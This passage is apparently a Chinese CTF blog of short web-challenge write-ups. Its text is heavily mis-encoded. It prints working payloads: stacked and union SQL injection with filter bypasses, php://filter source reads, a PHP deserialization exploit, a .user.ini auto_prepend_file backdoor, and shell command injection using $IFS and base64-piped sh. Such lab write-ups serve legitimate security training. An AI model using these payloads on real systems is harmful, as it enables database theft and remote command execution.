&lt;p&gt;array(1) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(4) â€œtestâ€&lt;br&gt;}&lt;br&gt;3. &lt;code&gt;1&amp;#39;; show tables from ctftraining #&lt;/code&gt;æ‹¿åˆ°è¡¨å&lt;br&gt;array(1) {&lt;br&gt;    [0]=&amp;gt;&lt;br&gt;    string(10) â€œFLAG_TABLEâ€&lt;br&gt;}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(4) â€œnewsâ€&lt;br&gt;}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(5) â€œusersâ€&lt;br&gt;}&lt;br&gt;4. &lt;code&gt;1&amp;#39;;show columns from ctftraining.FLAG_TABLE #&lt;/code&gt;å‘ç°ä¸è¡Œï¼Œè¢«è¿‡æ»¤äº†ï¼Ÿï¼Ÿ&lt;br&gt;5. &lt;code&gt;1&amp;#39;;show tables #&lt;/code&gt;çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(16) â€œ1919810931114514â€&lt;br&gt;}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(5) â€œwordsâ€&lt;br&gt;}&lt;br&gt;6. åˆ†åˆ«æŸ¥çœ‹wordså’Œ1919810931114514é‡Œé¢æœ‰äº›ä»€ä¹ˆ  &lt;/p&gt;
&lt;p&gt; &lt;code&gt;1&amp;#39;;show columns from words #&lt;/code&gt;:array(6) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(2) â€œidâ€&lt;br&gt;  [1]=&amp;gt;&lt;br&gt;  string(7) â€œint(10)â€&lt;br&gt;  [2]=&amp;gt;&lt;br&gt;  string(2) â€œNOâ€&lt;br&gt;  [3]=&amp;gt;&lt;br&gt;  string(0) â€œâ€&lt;br&gt;  [4]=&amp;gt;&lt;br&gt;  NULL&lt;br&gt;  [5]=&amp;gt;&lt;br&gt;  string(0) â€œâ€&lt;br&gt;}&lt;/p&gt;
&lt;p&gt;array(6) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(4) â€œdataâ€&lt;br&gt;  [1]=&amp;gt;&lt;br&gt;  string(11) â€œvarchar(20)â€&lt;br&gt;  [2]=&amp;gt;&lt;br&gt;  string(2) â€œNOâ€&lt;br&gt;  [3]=&amp;gt;&lt;br&gt;  string(0) â€œâ€&lt;br&gt;  [4]=&amp;gt;&lt;br&gt;  NULL&lt;br&gt;  [5]=&amp;gt;&lt;br&gt;  string(0) â€œâ€&lt;br&gt;}&lt;br&gt;&lt;code&gt;1&amp;#39;;show columns from &lt;/code&gt;1919810931114514&lt;code&gt; #&lt;/code&gt;ï¼ˆæ³¨æ„è¿™é‡Œè¦åŠ åå¼•å·ï¼‰ï¼šarray(6) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(4) â€œflagâ€&lt;br&gt;  [1]=&amp;gt;&lt;br&gt;  string(12) â€œvarchar(100)â€&lt;br&gt;  [2]=&amp;gt;&lt;br&gt;  string(2) â€œNOâ€&lt;br&gt;  [3]=&amp;gt;&lt;br&gt;  string(0) â€œâ€&lt;br&gt;  [4]=&amp;gt;&lt;br&gt;  NULL&lt;br&gt;  [5]=&amp;gt;&lt;br&gt;  string(0) â€œâ€&lt;br&gt;}çœ‹åˆ°äº†æœ‰flag&lt;br&gt;7. æ¥ä¸‹æ¥æ€ä¹ˆè¯»åˆ°flagå°±æ˜¯å…³é”®äº†&lt;/p&gt;
&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;; alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; words1;alter table `&lt;span class=&#34;hljs-number&#34;&gt;1919810931114514&lt;/span&gt;` rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt;;alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; change flag &lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt; varchar(&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;; alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; words1;alter table `&lt;span class=&#34;hljs-number&#34;&gt;1919810931114514&lt;/span&gt;` rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt;;alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; add &lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt; int;a;ter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; alter &lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; default &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;ç„¶åç”¨&lt;code&gt;1&amp;#39;or 1=1 #&lt;/code&gt;æ‹¿åˆ°flag&lt;/p&gt;
&lt;p&gt;å¦payloadï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight smali&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs smali&#34;&gt;1&amp;#x27;;&lt;br&gt;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;&lt;br&gt;prepare execsql from @a;&lt;span class=&#34;hljs-built_in&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;execute &lt;/span&gt;execsql;&lt;span class=&#34;hljs-comment&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;æŠ¤ç½‘æ¯-2018-easy-tornado&#34;&gt;&lt;a href=&#34;#æŠ¤ç½‘æ¯-2018-easy-tornado&#34; class=&#34;headerlink&#34; title=&#34;[æŠ¤ç½‘æ¯ 2018]easy_tornado&#34;&gt;&lt;/a&gt;[æŠ¤ç½‘æ¯ 2018]easy_tornado&lt;/h2&gt;&lt;p&gt;SSTIï¼Œhandler.settingsæ‹¿secret-cookie&lt;/p&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL&lt;/h2&gt;&lt;p&gt;ä¸‡èƒ½å¯†ç ç›´æ¥æ‹¿flag&lt;/p&gt;
&lt;h2 id=&#34;RoarCTF-2019-Easy-Calc&#34;&gt;&lt;a href=&#34;#RoarCTF-2019-Easy-Calc&#34; class=&#34;headerlink&#34; title=&#34;[RoarCTF 2019]Easy Calc&#34;&gt;&lt;/a&gt;[RoarCTF 2019]Easy Calc&lt;/h2&gt;&lt;p&gt;æŸ¥çœ‹æºä»£ç å‘ç°/calc.php?num=ï¼Œè®¿é—®calc.phpæ‹¿åˆ°æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;error_reporting(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;num&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;br&gt;    show_source(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;num&amp;#x27;&lt;/span&gt;];&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$blacklist&lt;/span&gt; = [&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\t&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;`&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\[&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\]&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\$&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\^&amp;#x27;&lt;/span&gt;];&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$blacklist&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$blackitem&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$blackitem&lt;/span&gt; . &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/m&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;)) &amp;#123;&lt;br&gt;                        &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;what are you want to do?&amp;quot;&lt;/span&gt;);&lt;br&gt;                &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;echo &amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;phpçš„è§£æè§„åˆ™ï¼Œå½“phpè¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¦‚æœå˜é‡å‰é¢æœ‰ç©ºæ ¼ï¼Œä¼šå»æ‰å‰é¢çš„ç©ºæ ¼å†è§£æ,ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦ç”¨&lt;code&gt;? num=&lt;/code&gt;å°±å¯ä»¥ç»•è¿‡wafçš„æ£€æµ‹ï¼Œä½†æ˜¯è¿™æ ·åªèƒ½ç»•è¿‡wafä½†æ˜¯å¹¶ä¸èƒ½ç»•è¿‡é»‘åå•æ£€æµ‹ã€‚ç”¨chr(47)ç»•è¿‡&lt;code&gt;\&lt;/code&gt;æ£€æµ‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;HCTF-2018-admin&#34;&gt;&lt;a href=&#34;#HCTF-2018-admin&#34; class=&#34;headerlink&#34; title=&#34;[HCTF 2018]admin&#34;&gt;&lt;/a&gt;[HCTF 2018]admin&lt;/h2&gt;&lt;p&gt;å‡ºé¢˜äººWPï¼šâ€&lt;a href=&#34;https://www.ckj123.com/?p=147&amp;quot;&#34;&gt;https://www.ckj123.com/?p=147&amp;quot;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹å¯†ç é¡µé¢æ³¨é‡Šæœ‰gitæºç æ³„éœ²ï¼Œ&lt;a href=&#34;https://github.com/woadsl1234/hctf_flask/%EF%BC%8C&#34;&gt;https://github.com/woadsl1234/hctf_flask/ï¼Œ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ®è¯´æœ¬é¢˜æœ‰å¤šç§è§£æ³•ï¼Œä¸€æ˜¯flaskçš„sessionæœºåˆ¶ï¼Œsessionæ³„éœ²åè§£å¯†å‡ºæ¥ï¼Œä¿®æ”¹nameçš„å€¼ä¸ºadminå†ç”¨æºç ä¸­çš„secret-keyåŠ å¯†ï¼Œå°±å¯ä»¥å®ç°ä½ç½®adminã€‚äºŒæ˜¯ç”¨åˆ°UnicodeåŒå½¢å­—å¼•èµ·çš„å®‰å…¨é—®é¢˜ï¼š&lt;/p&gt;
&lt;p&gt;spotifyä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹æ¼æ´](&lt;a href=&#34;https://labs.spotify.com/2013/06/18/creative-usernames/&#34;&gt;https://labs.spotify.com/2013/06/18/creative-usernames/&lt;/a&gt;)&lt;br&gt;æ¼æ´ç®€ä»‹:&lt;br&gt;æ‰¾ä¸€ä¸ªéœ€è¦é»‘æ‰çš„è´¦å·ï¼Œæ¯”å¦‚ä»¥bigbirdä¸ºä¾‹ã€‚åˆ›å»ºä¸€ä¸ªè´¦æˆ·åä¸º á´®á´µá´³á´®á´µá´¿á´° (in python this is the string uâ€™\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30â€²)ã€‚ç„¶åç”³è¯·ä¿®æ”¹å¿˜è®°å¯†ç ï¼Œä¿®æ”¹è‡ªå·±ç”³è¯·çš„è´¦å·å¯†ç ã€‚ä¿®æ”¹ä¹‹åä»¥åˆšåˆšè®¾ç½®çš„å¯†ç ç™»å½•bigbirdã€‚å°±å¯ä»¥æˆåŠŸç™»å½•ã€‚ä¸‰æ˜¯æ¡ä»¶ç«äº‰ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File&lt;/h2&gt;&lt;p&gt;base64_decode(/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php)&lt;/p&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL&lt;/h2&gt;&lt;p&gt;&lt;code&gt;check.php?username=admin&amp;amp;password=-1&amp;#39;/**/union/**/select/**/1,database(),database()/**/%23&lt;/code&gt;æ‹¿åˆ°æ•°æ®åº“å=&amp;gt;â€™geekâ€™&lt;/p&gt;
&lt;p&gt;&lt;code&gt;check.php?username=admin&amp;amp;password=-1&amp;#39;/**/union/**/select/**/1,2,(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)/**/%23&lt;/code&gt;æ‹¿åˆ°è¡¨å=&amp;gt;â€™geekuserâ€™,â€™l0ve1ysq1â€™&lt;/p&gt;
&lt;p&gt;&lt;code&gt;check.php?username=admin&amp;amp;password=-1&amp;#39;/**/union/**/select/**/1,2,(select/**/password/**/from/**/l0ve1ysq1/**/limit/**/15,1)/**/%23&lt;/code&gt;æ‹¿åˆ°flag=&amp;gt;â€™flag{6d319459-bf52-4be1-8371-83d8d2b8a8d2}â€™&lt;/p&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-PHP&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-PHP&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP&lt;/h2&gt;&lt;p&gt;/&lt;a href=&#34;http://www.zipæºç /&#34;&gt;www.zipæºç &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;çœ‹æºç æ˜¯PHPååºåˆ—åŒ–&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Name&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Name;&lt;br&gt;var_dump(urlencode(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;)));&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-Knife&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-Knife&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife&lt;/h2&gt;&lt;p&gt;ç™½ç»™ä¸€å¥è¯&lt;/p&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019-Http&#34;&gt;&lt;a href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019-Http&#34; class=&#34;headerlink&#34; title=&#34;[æå®¢å¤§æŒ‘æˆ˜ 2019]Http&#34;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]Http&lt;/h2&gt;&lt;p&gt;/Secret.php&lt;/p&gt;
&lt;p&gt;æ”¹Refererã€UAã€X-Forwarded-For&lt;/p&gt;
&lt;h2 id=&#34;SUCTF-2019-CheckIn&#34;&gt;&lt;a href=&#34;#SUCTF-2019-CheckIn&#34; class=&#34;headerlink&#34; title=&#34;[SUCTF 2019]CheckIn&#34;&gt;&lt;/a&gt;[SUCTF 2019]CheckIn&lt;/h2&gt;&lt;p&gt;.user.ini(&lt;a href=&#34;https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html&#34;&gt;https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;ä¸»è¦åˆ©ç”¨å°±æ˜¯åœ¨.user.iniæ–‡ä»¶ä¸­å†™å…¥ï¼š&lt;code&gt;auto_prepend_file=01.gif&lt;/code&gt;,å°±ä¼šåœ¨ç›®å½•ä¸‹çš„phpæ–‡ä»¶ä¸­è‡ªåŠ¨åŒ…å«01.gif&lt;/p&gt;
&lt;h2 id=&#34;GXYCTF2019-Ping-Ping-Ping&#34;&gt;&lt;a href=&#34;#GXYCTF2019-Ping-Ping-Ping&#34; class=&#34;headerlink&#34; title=&#34;[GXYCTF2019]Ping Ping Ping&#34;&gt;&lt;/a&gt;[GXYCTF2019]Ping Ping Ping&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;åˆ©ç”¨ï¼›æˆ–è€…|å¯ä»¥æ‰§è¡Œå‘½ä»¤&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å‘ç°ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¯ä»¥$IFSç»•è¿‡,å¦å¤–è¿˜æœ‰&lt;/p&gt;
&lt;figure class=&#34;highlight mel&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs mel&#34;&gt;&amp;lt; ã€&amp;lt;&amp;gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ $&amp;#123;IFS&amp;#125;ã€$IFSã€&amp;#123;cat,flag.php&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ä¸èƒ½å‡ºç°flagï¼Œé€šé…ç¬¦ä¹Ÿä¸èƒ½ç”¨ï¼Œåªå¥½ç›´æ¥å…¨éƒ½è¯»å‡ºæ¥&lt;/p&gt;
&lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;/?ip=127.0.0.1|&lt;span class=&#34;hljs-keyword&#34;&gt;cat&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$IFS&lt;/span&gt;`&lt;span class=&#34;hljs-keyword&#34;&gt;ls&lt;/span&gt;`&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æˆ–è€…&lt;code&gt;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å¦å¤–é»‘åå•ç»•è¿‡è¿˜æœ‰ä»¥ä¸‹è¿™äº›æ–¹æ³•&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ACTF2020-æ–°ç”Ÿèµ›-Include&#34;&gt;&lt;a href=&#34;#ACTF2020-æ–°ç”Ÿèµ›-Include&#34; class=&#34;headerlink&#34; title=&#34;[ACTF2020 æ–°ç”Ÿèµ›]Include&#34;&gt;&lt;/a&gt;[ACTF2020 æ–°ç”Ÿèµ›]Include&lt;/h2&gt;&lt;p&gt;base64_decode(/?file=php://filter/convert.base64-encode/resource=flag.php)&lt;/p&gt;
&lt;h2 id=&#34;ACTF2020-æ–°ç”Ÿèµ›-BackupFile&#34;&gt;&lt;a href=&#34;#ACTF2020-æ–°ç”Ÿèµ›-BackupFile&#34; class=&#34;headerlink&#34; title=&#34;[ACTF2020 æ–°ç”Ÿèµ›]BackupFile&#34;&gt;&lt;/a&gt;[ACTF2020 æ–°ç”Ÿèµ›]BackupFile&lt;/h2&gt;&lt;p&gt;å¸¸è§å¤‡ä»½æ–‡ä»¶ *.swp   *.bak&lt;/p&gt;
&lt;p&gt;è®¿é—®index.php.bakæ‹¿åˆ°æºç &lt;/p&gt;
